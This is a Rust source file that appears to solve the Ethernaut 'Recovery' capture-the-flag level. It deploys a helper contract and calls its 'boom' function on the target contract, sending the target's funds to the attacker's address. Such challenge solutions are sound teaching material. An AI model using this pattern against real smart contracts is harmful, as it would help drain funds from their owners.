use crate::abi::find_token::FindToken;
use async_trait::async_trait;
use ctf::ethernaut::lvl17_recovery::*;
use ethers::prelude::*;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let contract = Recovery::new(target.address, offender.clone());
        let hack_contract =
            FindToken::deploy(offender.to_owned(), ())?.send().await?;
        hack_contract
            .boom(contract.address(), offender.address())
            .send()
            .await?;
        Ok(())
    }
}
